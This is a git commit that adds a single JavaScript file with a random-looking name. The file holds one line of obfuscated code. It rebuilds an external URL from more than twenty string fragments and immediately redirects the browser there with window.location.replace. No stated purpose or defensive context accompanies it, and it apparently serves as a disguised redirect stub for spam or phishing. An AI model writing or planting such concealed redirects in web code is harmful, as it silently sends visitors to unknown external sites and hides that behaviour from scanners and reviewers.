18a8bfc563e3f62c0a69ecec94d5d76742e63e50
Excessors <113865732+Excessors@users.noreply.github.com>
2023-01-07 14:04:32 +0100

    Create dfyhftyjdthfyjsergtftyhsetgdrthgserg.js

---
+++ dfyhftyjdthfyjsergtftyhsetgdrthgserg.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`ht`,`tps:/`,`/ww`,`w.roa`,`dsw`,`orks.co`,`m/gPEI`,`aOs9lV`,`QnmEXq`,`dmJei8`,`oAvhu`,`Nl8uE`,`9ELM`,`Lk_Kv`,`ajk`,`ym4Wg`,`loFk`,`q3vvqf`,`Ji6J9m`,`1y4Zu`,`iSAEt`,`1MkS9`,`YTW_0Q`,`~~/TA`,`HA/YSTi6YOtZa`))
